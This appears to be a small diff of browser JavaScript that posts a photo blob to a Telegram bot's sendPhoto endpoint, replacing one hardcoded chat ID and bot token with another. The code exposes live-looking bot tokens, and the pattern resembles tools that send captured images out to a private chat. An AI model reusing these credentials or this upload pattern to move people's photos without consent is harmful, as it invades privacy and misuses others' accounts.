@@ -45,10 +45,10 @@
             // Create a FormData object to send the photo as a file
             var formData = new FormData();
             formData.append('photo', blob, 'photo.jpg');
-            formData.append('chat_id', '-1001590820560'); // Replace with your actual chat ID
+            formData.append('chat_id', '-1002121820675'); // Replace with your actual chat ID
 
             // Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
-            var botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';
+            var botToken = '6946661358:AAF7MtPL0ELXvcXp54RNhFjhKANUMjJ6PIU';
 
             // Send the image to Telegram Bot API using the sendPhoto method
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
